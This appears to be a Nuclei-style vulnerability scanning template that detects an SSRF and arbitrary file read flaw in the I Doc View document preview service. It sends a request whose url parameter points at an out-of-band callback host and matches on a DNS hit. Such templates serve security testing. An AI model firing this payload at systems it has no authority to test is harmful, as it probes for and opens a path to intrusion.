id: poc-yaml-idocv-view-url-anyfile-read
info:
  name: I Doc View Online Document Preview SSRF Arbitrary File Read
  author: ProjectDiscoveryAI
  severity: high
  tags: ssrf
http:
  - raw:
      - |
        GET /view/url?url=http://{{interactsh-url}} HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
